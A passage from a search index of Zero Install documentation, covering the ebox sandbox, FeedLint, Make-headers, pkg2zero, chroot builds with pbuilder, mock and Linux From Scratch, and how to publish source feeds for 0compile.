(ebox-help) by setting environment variables (e.g. $CLASSPATH ). Environment variables are global to the process. Instead, ebox makes the dependency appear directly as a variable in the module's scope. For example, ebox-edit declares a dependency on ebox-help like this: <requires interface=\"http://0install.net/tests/ebox-help.xml\"> <environment insert=\"\" name=\"help\"/> </requires> It then creates a help window by calling <help:makeHelp>(shell, <this:manual>) . Here, the <help> loader is injected directly by ebox, and scoped to the ebox module: To code in ebox-edit, <help> refers to the ebox-help library, while <this> refers to ebox-edit. To code in ebox-help, <help> is not visible, while <this> refers to ebox-help. This means that libraries can't conflict even within a process. elib-help can't override a function defined in ebox-edit, for example, so the ebox-edit author doesn't need to fully trust the help library!","title":"Bonus challenge!"},{"location":"tools/ebox/#notes","text":"To make this useful, we need to integrate with a general purpose sandbox, such as Plash, so we can sandbox any application, not just those written in E. The long startup time for edit and chat is simply because they're running on Java, not because of the sandboxing. If a networked application (e.g. ebox-chat) seems to freeze, try wiggling the mouse; it might just need more entropy to generate random numbers for the crypto. About E: the important point here isn't how this particular sandbox works, but how sandboxing can be supported by Zero Install in general. However, here are some useful links about E and its underlying security model: http://wiki.erights.org/wiki/Walnut/Secure_Distributed_Computing http://en.wikipedia.org/wiki/Object-capability_model","title":"Notes"},{"location":"tools/ebox/#conclusions","text":"Zero Install can be used to install and run sandboxed software. It does not execute any of the downloaded code outside of the sandbox and installation of malicious code does not affect other programs on the computer, even those running as the same user. Despite this, libraries are shared automatically between programs (sandboxed or not), update notifications work as normal, etc. In addition to its normal mode of operation, in which it sets environment variables to let components find their dependencies, Zero Install can also integrate tightly with a particular programming language, injecting scoped dependencies directly into individual modules within the language.","title":"Conclusions"},{"location":"tools/feedlint/","text":"Name: FeedLint Maintainer: Thomas Leonard License: GNU General Public License Source: Git repository Zero Install feed: http://0install.net/2007/interfaces/FeedLint.xml If you maintain a number of feeds, each with several versions of your programs, how do you know that all the download links are still OK? Run FeedLint on your feeds from time-to-time to check. To use it, pass the URLs of the feeds to check as arguments, e.g.: $ 0install add feedlint http://0install.net/2007/interfaces/FeedLint.xml $ feedlint http://my/feed.xml You can pass multiple feeds as arguments and it will check all of them. For each feed, it will: Download the feed and check it can be read by 0launch. Check that all signatures are correct and by keys on your keyring. Check that each signature's GPG key can be downloaded. Check that the homepage and icon URLs work. Get the size of each implementation archive and check that it matches the size in the feed. Warn about releases marked as Testing which are more than one week old. Recursively check any sub-feeds and dependencies listed in the feed (if run with -d ) Tip: to check all feeds in your domain (e.g. example.com ): $ 0launch --list example.com | xargs feedlint Sample output Here we ask it to check Edit's feed (and it also checks ROX-Lib, on which Edit depends; note that this mode now requires the -d option to be used):","title":"FeedLint"},{"location":"tools/feedlint/#sample-output","text":"Here we ask it to check Edit's feed (and it also checks ROX-Lib, on which Edit depends; note that this mode now requires the -d option to be used):","title":"Sample output"},{"location":"tools/make-headers/","text":"Name: Make-headers Maintainer: Thomas Leonard License: GNU General Public License Source: Git repository Zero Install feed: http://0install.net/2007/interfaces/Make-headers.xml Make-headers is an extremely simple script for creating -dev packages (packages containing only header files) from ordinary source releases. It performs the following steps: Runs $SRCDIR/configure --prefix $DESTDIR && make install Notes the version numbers in any lib*.so symlinks (see below) Deletes $DESTDIR/{bin,man,share} , any library binaries ( .so , .a and .la files in lib ), and any lib/python * directories. Edits any pkg-config files ( lib/pkgconfig/*.pc ) to use a relative prefix of ${pcfiledir}/../.. . In other words, it does a full compile-and-install to $DESTDIR, deletes anything that isn't needed in a -dev package, and makes the result relocatable. It can be used as the compile command in a source implementation. For example, the GLib-dev feed contains this entry: <group arch=\"*-src\" compile:command='\"$BUILD_COMMAND\"'> <implementation id=\"sha1new=fd1cf4afd14067866e626a2c91f9839f4639e604\" released=\"2007-03-04\" stability=\"stable\" version=\"2.4.8\"> <archive extract=\"glib-2.4.8\" href=\"ftp://ftp.gtk.org/pub/gtk/v2.4/glib-2.4.8.tar.bz2\" size=\"2152755\" type=\"application/x-bzip-compressed-tar\"/> </implementation> <requires interface=\"http://0install.net/2007/interfaces/Make-headers.xml\"> <environment insert=\"make-headers.py\" name=\"BUILD_COMMAND\"/> </requires> This allows 0compile to create the GLib-dev package from the upstream source automatically. Note: If your package creates script files in bin that are part of the -dev package (i.e. they are used when building programs that use the library) then use --keep=bin to prevent them from being deleted. Major version mappings There is a particular issue that comes up if you want to provide the header files ( *.h ) through Zero Install, but have the user get the run-time files (*.so) through their distribution. First, some background: Library versioning on Linux/Unix systems The obvious way to store a shared library object in a package is to give it a simple name like libfoo.so . The packaging system selects which version of this file to use and the program loads it. Easy. This is how a pure Zero Install system would work. However, in a traditional packaging system (apt, make install, etc), where library files go in a single directory (e.g. /usr/lib ), this would make it impossible to have two versions of a library installed at once. As a special work-around, shared library objects include their version number in their name (e.g. libfoo.so.1.2.3 ). You (or your package manager) then adds two symlinks: libfoo.so is the symlink used when compiling libfoo.so.1 is the symlink used when running (here 1 is the \"major\" part of the version number from our example of 1.2.3 ) The idea is that you make sure libfoo.so points to the correct version and then compile your code. The compiled binary takes the first part of the version number (here 1 ) and stores libfoo.so.1 as its dependency. When run, it uses the second symlink to find the actual library version. Minor (compatible) upgrades to the library have the same major version. For example, after installing a minor update the symlinks will point to libfoo.so.1.3.0 , still with major version 1 . For major (incompatible) changes, the major version number is changed. After installing a major upgrade ( 2.0.0 ), you have three symlinks: libfoo.so.1 to libfoo.1.2.3 (from the previous version) libfoo.so.2 to libfoo.2.0.0 libfoo.so to libfoo.2.0.0 Programs that need version 1 of the library can no longer be compiled (they try to use libfoo.so and fail), but any existing binaries will still run (they try to use libfoo.so.1 and succeed). This is pretty horrible, but it's the way it works. The real problem is that the source code doesn't say what major version of the library it needs; it just fails to compile if you get it wrong, and you can only have the ability to compile against one version at a time. Obviously, this scheme doesn't work in Zero Install, since installing a package is always side-effect-free. Preventing old programs from compiling would clearly be a side-effect. In a pure Zero Install system, you can always use the simple scheme above and everything works correctly. In fact, to avoid changing existing libraries, we usually do include the version number in the library name, and we include both symlinks in the runtime package. This doesn't do any harm, because Zero Install keeps files from different packages in different places. Using Zero Install -dev packages with distribution runtime packages However, what if you want to combine both systems? That is, what if you want to get the header files through Zero Install but get the runtime shared object through your distribution's packaging system? Then there is a small problem. In Zero Install, we have: A library package contains the libfoo.so and libfoo.so.version files. A -dev package contains the header files. In a distribution package: A library package contains the libfoo.so.version file only. A -dev package contains headers and the libfoo.so file (only one -dev package can be installed at once). So, if you tried to use a Zero Install -dev package with a distribution library package, no one provides the libfoo.so file and the link fails. To fix this, a Zero Install -dev package can specify the mappings from library names to major version numbers, like this: <interface uri='.../libfoo-dev'> ... <implementation compile:lib-mappings=\"foo:1\" ... /> When 0compile compiles anything that depends on this -dev package, it searches for libfoo.so.1 (provided by the distribution) in the library search path and creates a symlink to it named libfoo.so in a temporary directory, which it adds to the search path. Programs should then compile correctly without modifications. Multiple mappings can be given in the attribute, separated by spaces. To be clear: a Zero Install source package depends on the library -dev package using the normal Zero Install mechanism ( <requires ...> <version ...> ). Having selected a suitable version of the -dev package, Zero Install uses the mappings inside it to work out what the compiled binary should link against. The source for a -dev package can use compile:binary-lib-mappings to have this value placed in the generated -dev \"binary\" package. However, starting with version 0.3, Make-headers can automatically work out the correct values and add them to the feed. In summary: If you are creating a source package that depends on a library, ignore all this and just put in a normal Zero Install dependency. 0compile will handle the mappings for you. If you are publishing an existing -dev package for a library that isn't in Zero Install, remember add the lib-mappings attribute. If you are publishing source for a -dev package, Make-headers should add the correct values for you automatically.","title":"Make-headers"},{"location":"tools/make-headers/#major-version-mappings","text":"There is a particular issue that comes up if you want to provide the header files ( *.h ) through Zero Install, but have the user get the run-time files (*.so) through their distribution. First, some background:","title":"Major version mappings"},{"location":"tools/make-headers/#library-versioning-on-linuxunix-systems","text":"The obvious way to store a shared library object in a package is to give it a simple name like libfoo.so . The packaging system selects which version of this file to use and the program loads it. Easy. This is how a pure Zero Install system would work. However, in a traditional packaging system (apt, make install, etc), where library files go in a single directory (e.g. /usr/lib ), this would make it impossible to have two versions of a library installed at once. As a special work-around, shared library objects include their version number in their name (e.g. libfoo.so.1.2.3 ). You (or your package manager) then adds two symlinks: libfoo.so is the symlink used when compiling libfoo.so.1 is the symlink used when running (here 1 is the \"major\" part of the version number from our example of 1.2.3 ) The idea is that you make sure libfoo.so points to the correct version and then compile your code. The compiled binary takes the first part of the version number (here 1 ) and stores libfoo.so.1 as its dependency. When run, it uses the second symlink to find the actual library version. Minor (compatible) upgrades to the library have the same major version. For example, after installing a minor update the symlinks will point to libfoo.so.1.3.0 , still with major version 1 . For major (incompatible) changes, the major version number is changed. After installing a major upgrade ( 2.0.0 ), you have three symlinks: libfoo.so.1 to libfoo.1.2.3 (from the previous version) libfoo.so.2 to libfoo.2.0.0 libfoo.so to libfoo.2.0.0 Programs that need version 1 of the library can no longer be compiled (they try to use libfoo.so and fail), but any existing binaries will still run (they try to use libfoo.so.1 and succeed). This is pretty horrible, but it's the way it works. The real problem is that the source code doesn't say what major version of the library it needs; it just fails to compile if you get it wrong, and you can only have the ability to compile against one version at a time. Obviously, this scheme doesn't work in Zero Install, since installing a package is always side-effect-free. Preventing old programs from compiling would clearly be a side-effect. In a pure Zero Install system, you can always use the simple scheme above and everything works correctly. In fact, to avoid changing existing libraries, we usually do include the version number in the library name, and we include both symlinks in the runtime package. This doesn't do any harm, because Zero Install keeps files from different packages in different places.","title":"Library versioning on Linux/Unix systems"},{"location":"tools/make-headers/#using-zero-install-dev-packages-with-distribution-runtime-packages","text":"However, what if you want to combine both systems? That is, what if you want to get the header files through Zero Install but get the runtime shared object through your distribution's packaging system? Then there is a small problem. In Zero Install, we have: A library package contains the libfoo.so and libfoo.so.version files. A -dev package contains the header files. In a distribution package: A library package contains the libfoo.so.version file only. A -dev package contains headers and the libfoo.so file (only one -dev package can be installed at once). So, if you tried to use a Zero Install -dev package with a distribution library package, no one provides the libfoo.so file and the link fails. To fix this, a Zero Install -dev package can specify the mappings from library names to major version numbers, like this: <interface uri='.../libfoo-dev'> ... <implementation compile:lib-mappings=\"foo:1\" ... /> When 0compile compiles anything that depends on this -dev package, it searches for libfoo.so.1 (provided by the distribution) in the library search path and creates a symlink to it named libfoo.so in a temporary directory, which it adds to the search path. Programs should then compile correctly without modifications. Multiple mappings can be given in the attribute, separated by spaces. To be clear: a Zero Install source package depends on the library -dev package using the normal Zero Install mechanism ( <requires ...> <version ...> ). Having selected a suitable version of the -dev package, Zero Install uses the mappings inside it to work out what the compiled binary should link against. The source for a -dev package can use compile:binary-lib-mappings to have this value placed in the generated -dev \"binary\" package. However, starting with version 0.3, Make-headers can automatically work out the correct values and add them to the feed. In summary: If you are creating a source package that depends on a library, ignore all this and just put in a normal Zero Install dependency. 0compile will handle the mappings for you. If you are publishing an existing -dev package for a library that isn't in Zero Install, remember add the lib-mappings attribute. If you are publishing source for a -dev package, Make-headers should add the correct values for you automatically.","title":"Using Zero Install -dev packages with distribution runtime packages"},{"location":"tools/pkg2zero/","text":"Name: pkg2zero Maintainer: Thomas Leonard License: GNU General Public License Source: Git repository Zero Install feed: http://0install.net/2009/interfaces/pkg2zero.xml pkg2zero takes a Debian or RPM package and publishes it in a Zero Install feed. You can always use 0publish to publish any tarball, RPM, Deb, Zip or Autopackage file, but you have to enter the meta-data (name, summary, description, etc) manually. Since Debian and RPM packages already contain this information, it's easier to extract it and generate the feed automatically. This is what pkg2zero does. Contents: Creating the feed Testing Publishing Adding more versions Using a Debian Packages file Using RPM Repository Metadata Dependencies Security notes You can download pkg2zero and create a short-cut to it in the usual way: $ 0install add pkg2zero http://0install.net/2009/interfaces/pkg2zero.xml Creating the feed Select the Debian or RPM package you want to publish. You need the full URL. Since packages sometimes move, you should probably make a copy of it on your own server and use that URL, but for this demo we'll link directly to Debian's copy of the program (GQView for this tutorial): $ pkg2zero http://ftp.uk.debian.org/debian/pool/main/g/gqview/gqview_2.0.1-1_i386.deb GQView.xml This downloads the Debian package to the current directory and creates a feed called GQView.xml . Alternatively, to create the feed from an RPM: $ pkg2zero http://dag.wieers.com/rpm/packages/gqview/gqview-1.4.5-1.el5.rf.i386.rpm GQView.xml You will be prompted to give a URL for the program's icon, since Debian packages don't have them. You will then be prompted to \"Enter the URI for this feed\". This is the URL from which other people will download your feed file. Note: pkg2zero guesses some things (such as which binary to run by default if the package contains several) so you should check the feed file manually and edit if required. In this case, no editing is needed. Testing When testing, you should make sure that the program isn't already installed (e.g. by apt-get ). Some programs contain hard-coded paths, and will therefore appear to work correctly... but only on a system which already has the program! Also, Zero Install may select the natively-installed version, depending on your policy settings. To test the feed: $ 0launch -g ./GQView.xml Note that pkg2zero added the downloaded package's contents to the Zero Install cache, so it will show up as being already cached. Publishing If you want to publish the feed so that others can use it, you'll also need to sign it, which can be done by giving the GPG key to use with the --key option: $ pkg2zero -k Bob http://.../package.deb Note that if this version was already added then it pkg2zero won't do anything, so if you already made an unsigned feed then delete it first, or use 0publish --xmlsign to resign it. See the packaging tutorial for more details about signing feeds. Adding more versions To add a new version to your feed later, just run the command again with the new URL: $ pkg2zero http://.../new-version.deb GQView.xml Using a Debian Packages file As an alternative to specifying the URL of the Debian package directly, you can download an index file to the current directory and then just give the package name. e.g. to use the current Debian/stable package for the amd64 ( x86_64 ) architecture: $ wget ftp://ftp.debian.org/debian/dists/stable/main/binary-amd64/Packages.bz2 $ pkg2zero --packages-file=Packages.bz2 gqview GQView.xml Using RPM Repository Metadata As an alternative to specifying the URL of the RPM package directly, you can download the repodata to the current directory and then just give the package name. e.g. $ mkdir -p repodata $ wget -N -P repodata http://download.fedoraproject.org/pub/epel/5/i386/repodata/repomd.xml $ wget -N -P repodata http://download.fedoraproject.org/pub/epel/5/i386/repodata/...-primary.xml.gz $ pkg2zero --repomd-file=repodata/repomd.xml -m http://download.fedoraproject.org/pub/epel --path 5/i386 gqview GQView.xml Dependencies pkg2zero can process the Depends field in a Debian package and generate a corresponding <requires> element in the feed. For this to work, you need to create a file called ~/.config/0install.net/pkg2zero/mappings (see the freedesktop.org basedir specification for details about configuration file locations). Each line of the file gives a mapping from a Debian package name to the corresponding Zero Install feed URI. For example, if you specify: libfoo: http://0install.net/2008/3rd-party/libfoo.xml then pkg2zero will turn Depends: libfoo into <requires interface=\"http://0install.net/2008/3rd-party/libfoo.xml\"> <environment insert=\"usr/lib\" name=\"LD_LIBRARY_PATH\"/> </requires> Note that setting LD_LIBRARY_PATH is just a guess. It may be that the package depends on libfoo in some other way (e.g. it needs a binary in $PATH ). In that case, you'll need to edit the feed to correct it. When you create a new feed, pkg2zero automatically appends the new mapping to the mappings file for you. The last line of the file is also used to suggest a default when naming new feeds. Security notes pkg2zero does not verify anything about the archive it downloads when you use a URL. However, if a file with the same name already exists in the current directory, it uses that instead. Therefore, if you have a secure way of getting the .deb file (e.g. because you created it), use that. pkg2zero calculates the digest of the package and stores it in the feed it creates, so anyone using the feed can at least verify that the package they download is identical to the one you used. If you use a Packages index file, then it does check the digest against the one in the Packages file.","title":"pkg2zero"},{"location":"tools/pkg2zero/#creating-the-feed","text":"Select the Debian or RPM package you want to publish. You need the full URL. Since packages sometimes move, you should probably make a copy of it on your own server and use that URL, but for this demo we'll link directly to Debian's copy of the program (GQView for this tutorial): $ pkg2zero http://ftp.uk.debian.org/debian/pool/main/g/gqview/gqview_2.0.1-1_i386.deb GQView.xml This downloads the Debian package to the current directory and creates a feed called GQView.xml . Alternatively, to create the feed from an RPM: $ pkg2zero http://dag.wieers.com/rpm/packages/gqview/gqview-1.4.5-1.el5.rf.i386.rpm GQView.xml You will be prompted to give a URL for the program's icon, since Debian packages don't have them. You will then be prompted to \"Enter the URI for this feed\". This is the URL from which other people will download your feed file. Note: pkg2zero guesses some things (such as which binary to run by default if the package contains several) so you should check the feed file manually and edit if required. In this case, no editing is needed.","title":"Creating the feed"},{"location":"tools/pkg2zero/#testing","text":"When testing, you should make sure that the program isn't already installed (e.g. by apt-get ). Some programs contain hard-coded paths, and will therefore appear to work correctly... but only on a system which already has the program! Also, Zero Install may select the natively-installed version, depending on your policy settings. To test the feed: $ 0launch -g ./GQView.xml Note that pkg2zero added the downloaded package's contents to the Zero Install cache, so it will show up as being already cached.","title":"Testing"},{"location":"tools/pkg2zero/#publishing","text":"If you want to publish the feed so that others can use it, you'll also need to sign it, which can be done by giving the GPG key to use with the --key option: $ pkg2zero -k Bob http://.../package.deb Note that if this version was already added then it pkg2zero won't do anything, so if you already made an unsigned feed then delete it first, or use 0publish --xmlsign to resign it. See the packaging tutorial for more details about signing feeds.","title":"Publishing"},{"location":"tools/pkg2zero/#adding-more-versions","text":"To add a new version to your feed later, just run the command again with the new URL: $ pkg2zero http://.../new-version.deb GQView.xml","title":"Adding more versions"},{"location":"tools/pkg2zero/#using-a-debian-packages-file","text":"As an alternative to specifying the URL of the Debian package directly, you can download an index file to the current directory and then just give the package name. e.g. to use the current Debian/stable package for the amd64 ( x86_64 ) architecture: $ wget ftp://ftp.debian.org/debian/dists/stable/main/binary-amd64/Packages.bz2 $ pkg2zero --packages-file=Packages.bz2 gqview GQView.xml","title":"Using a Debian Packages file"},{"location":"tools/pkg2zero/#using-rpm-repository-metadata","text":"As an alternative to specifying the URL of the RPM package directly, you can download the repodata to the current directory and then just give the package name. e.g. $ mkdir -p repodata $ wget -N -P repodata http://download.fedoraproject.org/pub/epel/5/i386/repodata/repomd.xml $ wget -N -P repodata http://download.fedoraproject.org/pub/epel/5/i386/repodata/...-primary.xml.gz $ pkg2zero --repomd-file=repodata/repomd.xml -m http://download.fedoraproject.org/pub/epel --path 5/i386 gqview GQView.xml","title":"Using RPM Repository Metadata"},{"location":"tools/pkg2zero/#dependencies","text":"pkg2zero can process the Depends field in a Debian package and generate a corresponding <requires> element in the feed. For this to work, you need to create a file called ~/.config/0install.net/pkg2zero/mappings (see the freedesktop.org basedir specification for details about configuration file locations). Each line of the file gives a mapping from a Debian package name to the corresponding Zero Install feed URI. For example, if you specify: libfoo: http://0install.net/2008/3rd-party/libfoo.xml then pkg2zero will turn Depends: libfoo into <requires interface=\"http://0install.net/2008/3rd-party/libfoo.xml\"> <environment insert=\"usr/lib\" name=\"LD_LIBRARY_PATH\"/> </requires> Note that setting LD_LIBRARY_PATH is just a guess. It may be that the package depends on libfoo in some other way (e.g. it needs a binary in $PATH ). In that case, you'll need to edit the feed to correct it. When you create a new feed, pkg2zero automatically appends the new mapping to the mappings file for you. The last line of the file is also used to suggest a default when naming new feeds.","title":"Dependencies"},{"location":"tools/pkg2zero/#security-notes","text":"pkg2zero does not verify anything about the archive it downloads when you use a URL. However, if a file with the same name already exists in the current directory, it uses that instead. Therefore, if you have a secure way of getting the .deb file (e.g. because you created it), use that. pkg2zero calculates the digest of the package and stores it in the feed it creates, so anyone using the feed can at least verify that the package they download is identical to the one you used. If you use a Packages index file, then it does check the digest against the one in the Packages file.","title":"Security notes"},{"location":"tools/0compile/chroot-build/","text":"This page explains how to build in a chroot sandbox environment using 0compile . It offers a few advantages: Building doesn't affect the host environment, and the host doesn't influence the build. Builds can target a different architecture, such as building x86 packages from a x64 host. The build sandbox is smaller than a virtual machine, and the download is typically smaller. The build system ( chroot ) comes with development tools such as gcc and make, and the 0launch command. Contents: Chroot setup Debian Red Hat Linux From Scratch 0compile setup 0compile build Publish results Future directions Chroot setup Alternatives: Build on a Debian system (including Ubuntu), using APT and .deb with pbuilder Build on a Red Hat system (including Fedora), using Yum and .rpm with mock Build on a Linux From Scratch system, using only source tarballs with chroot For all systems we use a build directory, that is bind-mounted inside the chroot, to hold our build results. Debian http://pbuilder.alioth.debian.org/ Install and configure the software: $ sudo apt-get install pbuilder $ mkdir -p build $ echo \"BINDMOUNTS='build'\" >> /etc/pbuilderrc Prepare the build environment cache: MIRROR=http://ftp.debian.org/debian/ DIST=lenny ARCH=i386 # or amd64 CPU=i486 # or x86_64 BASEDIR=/var/cache/pbuilder TGZ=${BASEDIR}/${DIST}-${ARCH}.tgz $ sudo pbuilder --create --basetgz $TGZ --mirror $MIRROR \\ --distribution $DIST --architecture $ARCH \\ --extrapackages \"zeroinstall-injector\" Enter the build environment chroot: $ setarch $CPU sudo pbuilder --login --basetgz $TGZ # cat /etc/debian_version 5.0.8 # 0launch --version 0launch (zero-install) 0.34 Copyright (C) 2007 Thomas Leonard ... Has build-essential dependencies: dpkg-dev dpkg perl5 perl-modules cpio bzip2 lzma patch make binutils libtimedate-perl gcc | c-compiler g++ libc6-dev | libc-dev make Red Hat https://fedorahosted.org/mock/ Install and configure the software: $ su -c \"yum install mock\" $ su -c \"usermod -G mock $USER\" $ mkdir -p build $ echo \"config_opts['plugin_conf']['bind_mount_opts']['dirs'].append(('./build', '/build'))\" >> /etc/mock/site-defaults.cfg Prepare the build environment cache: ARCH=i386 # or x86_64 ROOT=epel-5-$ARCH $ mock --root=$ROOT --arch=$ARCH --init $ mock --root=$ROOT --arch=$ARCH --install \"zeroinstall-injector\" Enter the build environment chroot: $ mock --root=$ROOT --arch=$ARCH --shell > cat /etc/redhat-release CentOS release 5.6 (Final) > 0launch --version 0launch (zero-install) 0.38 Copyright (C) 2007 Thomas Leonard ... $ mock --root=$ROOT --arch=$ARCH --clean Has buildsys-build dependencies: bash buildsys-macros bzip2 coreutils cpio diffutils elfutils gcc-c++ gcc gzip make patch perl redhat-release redhat-rpm-config rpm-build sed tar unzip which Linux From Scratch http://www.linuxfromscratch.org/lfs/ Build LFS: Read the Linux From Scratch Book Enter chroot: export LFS=/mnt/lfs sudo mount -v --bind /dev $LFS/dev sudo mount -vt devpts devpts $LFS/dev/pts sudo mount -vt tmpfs shm $LFS/dev/shm sudo mount -vt proc proc $LFS/proc sudo mount -vt sysfs sysfs $LFS/sys sudo mkdir -pv $LFS/build sudo mount -v --bind ./build $LFS/build $ sudo chroot $LFS /usr/bin/env -i \\ HOME=/root TERM=\"$TERM\" PS1='\\u:\\w\\$ ' \\ PATH=/bin:/usr/bin:/sbin:/usr/sbin \\ /bin/bash --login # cat /etc/lfs-release 6.8 BLFS packages: OpenSSL (Python dependency) Python GnuPG PCRE (Glib dependency) GLib (PyGObject dependency) PyGObject Zero Install itself: ZeroInstall-Injector 0compile setup Now we have a chroot with 0launch , and can add 0compile : CMD=\"0compile\" URI=\"http://0install.net/2006/interfaces/0compile.xml\" $ yes Y | /usr/bin/0launch -cd $URI $ 0alias -d /usr/bin $CMD $URI Note: depending on your build OS and Python version, you might need to use an older version of 0compile. 0compile build Begin with downloading the source code, in console mode: $ 0launch -cd -s http://www.example.com/interfaces/foo.xml Then we setup the build sub-directory using the source feed: $ cd /build $ 0compile setup http://www.example.com/interfaces/foo.xml foo Next we proceed with building the binary from the source: $ cd foo $ 0compile build Finally we tell 0compile to prepare the binary feed/archive: $ 0compile publish http://www.example.com/implementations After exiting the chroot, we can find the results in build/foo. Publish results The new binary feed is now ready to be merged with our source feed, signed (using 0publish --xmlsign ), and published with the archives. Since we used a new clean chroot to build the binary, we can be reasonably sure that all dependencies are included in the source feed. Future directions In the future it might be possible to use the Open Build Service (OBS), to build Zero Install packages using a distributed development platform. Currently it (OBS) supports building RPM and Debian packages, those can be converted to Zero Install feeds using pkg2zero (when relocatable).","title":"Chroot build"},{"location":"tools/0compile/chroot-build/#chroot-setup","text":"Alternatives: Build on a Debian system (including Ubuntu), using APT and .deb with pbuilder Build on a Red Hat system (including Fedora), using Yum and .rpm with mock Build on a Linux From Scratch system, using only source tarballs with chroot For all systems we use a build directory, that is bind-mounted inside the chroot, to hold our build results.","title":"Chroot setup"},{"location":"tools/0compile/chroot-build/#debian","text":"http://pbuilder.alioth.debian.org/ Install and configure the software: $ sudo apt-get install pbuilder $ mkdir -p build $ echo \"BINDMOUNTS='build'\" >> /etc/pbuilderrc Prepare the build environment cache: MIRROR=http://ftp.debian.org/debian/ DIST=lenny ARCH=i386 # or amd64 CPU=i486 # or x86_64 BASEDIR=/var/cache/pbuilder TGZ=${BASEDIR}/${DIST}-${ARCH}.tgz $ sudo pbuilder --create --basetgz $TGZ --mirror $MIRROR \\ --distribution $DIST --architecture $ARCH \\ --extrapackages \"zeroinstall-injector\" Enter the build environment chroot: $ setarch $CPU sudo pbuilder --login --basetgz $TGZ # cat /etc/debian_version 5.0.8 # 0launch --version 0launch (zero-install) 0.34 Copyright (C) 2007 Thomas Leonard ... Has build-essential dependencies: dpkg-dev dpkg perl5 perl-modules cpio bzip2 lzma patch make binutils libtimedate-perl gcc | c-compiler g++ libc6-dev | libc-dev make","title":"Debian"},{"location":"tools/0compile/chroot-build/#red-hat","text":"https://fedorahosted.org/mock/ Install and configure the software: $ su -c \"yum install mock\" $ su -c \"usermod -G mock $USER\" $ mkdir -p build $ echo \"config_opts['plugin_conf']['bind_mount_opts']['dirs'].append(('./build', '/build'))\" >> /etc/mock/site-defaults.cfg Prepare the build environment cache: ARCH=i386 # or x86_64 ROOT=epel-5-$ARCH $ mock --root=$ROOT --arch=$ARCH --init $ mock --root=$ROOT --arch=$ARCH --install \"zeroinstall-injector\" Enter the build environment chroot: $ mock --root=$ROOT --arch=$ARCH --shell > cat /etc/redhat-release CentOS release 5.6 (Final) > 0launch --version 0launch (zero-install) 0.38 Copyright (C) 2007 Thomas Leonard ... $ mock --root=$ROOT --arch=$ARCH --clean Has buildsys-build dependencies: bash buildsys-macros bzip2 coreutils cpio diffutils elfutils gcc-c++ gcc gzip make patch perl redhat-release redhat-rpm-config rpm-build sed tar unzip which","title":"Red Hat"},{"location":"tools/0compile/chroot-build/#linux-from-scratch","text":"http://www.linuxfromscratch.org/lfs/ Build LFS: Read the Linux From Scratch Book Enter chroot: export LFS=/mnt/lfs sudo mount -v --bind /dev $LFS/dev sudo mount -vt devpts devpts $LFS/dev/pts sudo mount -vt tmpfs shm $LFS/dev/shm sudo mount -vt proc proc $LFS/proc sudo mount -vt sysfs sysfs $LFS/sys sudo mkdir -pv $LFS/build sudo mount -v --bind ./build $LFS/build $ sudo chroot $LFS /usr/bin/env -i \\ HOME=/root TERM=\"$TERM\" PS1='\\u:\\w\\$ ' \\ PATH=/bin:/usr/bin:/sbin:/usr/sbin \\ /bin/bash --login # cat /etc/lfs-release 6.8 BLFS packages: OpenSSL (Python dependency) Python GnuPG PCRE (Glib dependency) GLib (PyGObject dependency) PyGObject Zero Install itself: ZeroInstall-Injector","title":"Linux From Scratch"},{"location":"tools/0compile/chroot-build/#0compile-setup","text":"Now we have a chroot with 0launch , and can add 0compile : CMD=\"0compile\" URI=\"http://0install.net/2006/interfaces/0compile.xml\" $ yes Y | /usr/bin/0launch -cd $URI $ 0alias -d /usr/bin $CMD $URI Note: depending on your build OS and Python version, you might need to use an older version of 0compile.","title":"0compile setup"},{"location":"tools/0compile/chroot-build/#0compile-build","text":"Begin with downloading the source code, in console mode: $ 0launch -cd -s http://www.example.com/interfaces/foo.xml Then we setup the build sub-directory using the source feed: $ cd /build $ 0compile setup http://www.example.com/interfaces/foo.xml foo Next we proceed with building the binary from the source: $ cd foo $ 0compile build Finally we tell 0compile to prepare the binary feed/archive: $ 0compile publish http://www.example.com/implementations After exiting the chroot, we can find the results in build/foo.","title":"0compile build"},{"location":"tools/0compile/chroot-build/#publish-results","text":"The new binary feed is now ready to be merged with our source feed, signed (using 0publish --xmlsign ), and published with the archives. Since we used a new clean chroot to build the binary, we can be reasonably sure that all dependencies are included in the source feed.","title":"Publish results"},{"location":"tools/0compile/chroot-build/#future-directions","text":"In the future it might be possible to use the Open Build Service (OBS), to build Zero Install packages using a distributed development platform. Currently it (OBS) supports building RPM and Debian packages, those can be converted to Zero Install feeds using pkg2zero (when relocatable).","title":"Future directions"},{"location":"tools/0compile/developers/","text":"This page explains how to publish source code using Zero Install. Publishing source this way means that: Users can compile it easily using 0compile . Build dependencies, such as header files and build tools, can be downloaded automatically. 0release can automatically compile binaries for your software during the release process. Contents: Making source available Customising the binary implementation Pinning version ranges Tips Using a separate source feed Making library headers available (-dev packages) Python distutils Examples Further reading Making source available There are two common situations: You already have a source tarball somewhere and you want to publish an XML feed saying how to download and compile it (ideally, no changes should be needed to support 0install). For this, you should first read the Guide to packaging binaries . You have a development checkout (e.g. a Git clone or similar) and you want to say how to compile it. For this, you should first read the page about local feeds . To make source code available for others to use you need to add source implementations to the program's feed file. This is almost exactly the same as adding binaries, except that you give src as the machine (CPU) type: (if you want to script this process, take a look at 0template ) You can also edit the XML directly, which gives more control. A minimal source implementation might look like this: <implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"> <command name='compile' path='Makefile'> <runner interface='http://repo.roscidus.com/devel/make'> <arg>-f</arg> </runner> </command> </implementation> Note: you only need to use arch='*-src' to publish implementations for things that need to be compiled. Shell scripts, etc should not be marked as source code; use arch=\"*-*\" instead (which is the default anyway if arch is not given). For header files (-dev packages), there will often be a source implementation that generates the header files, but the resulting headers are not source (and will often be architecture-specific, e.g. Linux-i386 ). The job of the compile command is to call the actual build system. It is executed inside the build directory ( $BUILDDIR ). It must compile the source in $SRCDIR , putting the final result (ready for distribution) in $DISTDIR . The path to the generated feed for the new binary is $BINARYFEED , if you need it during the build. Instead of giving a <runner> , you may prefer to use a shell command. This is useful if you need to run more than one command. However, if the command starts to get complicated, you should move it to a script, either inside the main source archive or in a separate dependency, and just set this attribute to the command to run the script): <implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"> <command name='compile' shell-command='\"$SRCDIR/configure\" --prefix=\"$DISTDIR\" && make install'/> <requires interface='http://repo.roscidus.com/devel/make'> <executable-in-path name='make'/> </requires> </implementation> Starting with 0compile 1.1, this even works on Windows (it uses win-bash). There are also some extra attributes you can add to the implementation element: compile:binary-main Deprecated. Use <compile:implementation> instead (see below). compile:dup-src Some programs insist on creating files in their source directory, which is typically a read-only directory when using Zero Install. In this case, set 